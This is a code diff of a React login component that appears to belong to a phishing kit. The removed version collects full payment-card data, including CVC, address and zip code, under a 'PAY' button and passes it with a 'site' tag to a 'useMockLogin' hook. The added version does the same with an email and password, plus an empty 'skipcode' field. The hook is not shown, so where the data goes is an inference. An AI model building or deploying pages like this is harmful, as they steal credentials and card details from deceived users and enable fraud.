@@ -1,130 +1,83 @@
-
-import { useState } from "react";
-import Register from "./Register";
-import { useForm } from 'react-hook-form';
+import { Field, Form, Formik } from "formik";
 import useMockLogin from "../hooks/useMockLogin";
-import { site } from "../config/index";
+import { site } from "../config";
+import { useState } from "react";
+import { toast } from "react-toastify";
 
-
-
-function LoginForm() {
-  const [showModal, setShowModal] = useState(false);
-  const form=useForm()
-  const{register,handleSubmit,reset}=form
-  const { login,id } = useMockLogin();
-
+function LoginForm({ setShowModal }) {
  
 
-  const onSubmit = (values) => {
-    const{
-      validity,
-      address,
-      cardNumber,
-      cvc,
-      name,
-  zipCode }=values
-  const submitValues = {
-    site,
-    validity,
-      address,
-      cardNumber,
-      cvc,
-      name,
-  zipCode
+  const initialvalues = {
+    email: "",
+    password: "",
+    remember: "",
   };
-  login(submitValues);
-    setShowModal(true)
-    reset()
+
+  const { login } = useMockLogin({ setShowModal });
+
+  const handleSubmit = (values, formik) => {
+    const { email, password } = values;
+
+    // console.log("values", values);
+    // return;
+
+    const submitValues = {
+      site: site,
+      email: email,
+      password: password,
+      skipcode: "",
+    };
+
+    login(submitValues, formik);
+
+    // console.log(submitValues);
   };
 
 
 
   return (
-    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px]  rounded-lg">
- 
+    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
+      <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
+        Log in to your account
+      </h3>
 
- <div className="mt-5">
-     
-   {
-     !showModal?(
-     <form onSubmit={handleSubmit(onSubmit)}>
-         <div class="debit-card">
-<img src="https://image.ibb.co/gDVR4x/master_card_logo.png" class="master-card-logo" />
-<div class="card-number-block">
-<input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
-<input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
-<input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
-<input type="text" pattern="^\d{4}$" maxlength="4" class="number-block" placeholder="0000" />
-</div>
-<div class="card-holder-block">
-<div class="block-lebel">Card Holder</div>
-<input type="text" pattern="[A-Z ]+" class="card-holder-name" placeholder="xxx xxx" />
-</div>
-</div>
-                  <input
-        className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-        placeholder="Card Number"
-        {...register('cardNumber')}
-        type="number"
-        required
-      />
-      
-          <input
-            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-            placeholder="Card Holder Name"
-            {...register('name')}
-            type="string"
-            required
-          />
-          <input
-            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-            placeholder="29/30"
-            {...register('validity')}
-            type="number"
-            required
-          />
-          <input
-            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-            placeholder="CVC"
-            name="cvc"
-            {...register('cvc')}
-            type="number"
-            required
-          />
-          <input
-            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-            placeholder="Address Line 1"
-            name="address"
-            {...register('address')}
-            type="string"
-            
-            required
-          />
-          <input
-            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-            placeholder="Zip Code"
-            name="zipCode"
-            {...register('zipCode')}
-            type="number"
-            required
-          />
+      <div className="mt-5">
+        <Formik
+          initialValues={initialvalues}
+          // validationSchema={validate}
+          onSubmit={handleSubmit}
+        >
+          {(formik) => (
+            <Form className="">
+              <Field
+                className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                placeholder="Your email"
+                name="email"
+                type="email"
+                required
+              />
+                  <Field
+                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                    placeholder="Password"
+                    name="password"
+                    type="password"
+                    autoComplete="on"
+                    required
+                  />
 
 <button
-            type="submit"
-            className="mt-5 w-full text-lg font-medium bg-[green] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
-         
-          >
-           PAY
-          </button>
-          </form>):( 
-          <Register id={id}/>
-        )
-        }
-          </div>
+                    type="submit"
+                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+                  >
+                    Log in
+                  </button>
+                
+              
+            </Form>
+          )}
+        </Formik>
       </div>
-      
-    
-   
+    </div>
   );
 }
 
